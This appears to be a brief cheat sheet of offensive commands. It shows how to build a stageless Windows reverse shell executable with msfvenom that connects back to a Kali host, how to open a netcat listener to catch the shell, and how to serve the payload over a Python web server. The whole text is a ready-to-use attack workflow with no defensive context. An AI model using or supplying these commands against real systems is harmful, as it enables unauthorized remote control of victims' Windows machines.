**Create stageless reverse shell payload for windows on kali
msfvenom -p windows/shell_reverse_tcp LHOST=<kali ip> LPORT=<port> -f exe > reverse.exe
**Open a listener on kali for the reverse shell
nc -lvp <port>
**Web host the payload from kali
python3 -m http.server
